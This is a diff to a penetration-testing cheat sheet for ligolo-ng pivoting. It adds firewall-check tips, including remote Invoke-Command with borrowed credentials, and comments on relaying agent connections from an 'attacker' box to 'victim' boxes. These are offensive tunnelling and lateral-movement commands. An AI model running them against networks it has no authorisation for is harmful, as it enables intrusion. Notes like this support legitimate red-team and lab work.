@@ -15,9 +15,18 @@
 
 ---
 
+Before Starting, remember that firewalls exist and will block strange ports, often be default. Consider something like Test-NetConnection before creating tunnels
+```powershell
+Test-NetConnection -ComputerName <ip> -Port <port>
+
+# Wanna test connection from a box you dont have direct auth on? Might have to if envorntment firewall is WEIRD
+Invoke-Command -ComputerName <hostname> -Credential $cred -ScriptBlock { powershell Test-NetConnection -ComputerName <target> -Port 5985; Test-NetConnection -ComputerName <target> -Port 445 }
+```
 ## Quick Start (Single Pivot)
 
 ```bash
+cd /opt/tools/ligolo-ng/
+
 # ── ATTACKER: create tun interface ───────────────────────────────────────────
 sudo ip tuntap add user $(whoami) mode tun ligolo
 sudo ip link set ligolo up
@@ -82,7 +91,10 @@ sudo ip r add <new_subnet>/<cidr> dev ligolo<no.>
 
 # ── LIGOLO CONSOLE (session of agent that can reach the next box) ────────────
 # Tell agent1 to relay incoming agent connections
-listener_add --addr 0.0.0.0:11601 --to 127.0.0.1:11601
+listener_add --addr 0.0.0.0:11601 --to 127.0.0.1:11601 # if you used a different port when setting up, this will have to adjust.
+	# 0.0.0.0:port is what your pivot host is listening on
+	# 127.0.0.1:port is your attack box is listening on
+	
 
 # ── NEXT VICTIM BOX: connect through the chain ───────────────────────────────
 ./agent -connect <agent1_internal_ip>:11601 -ignore-cert
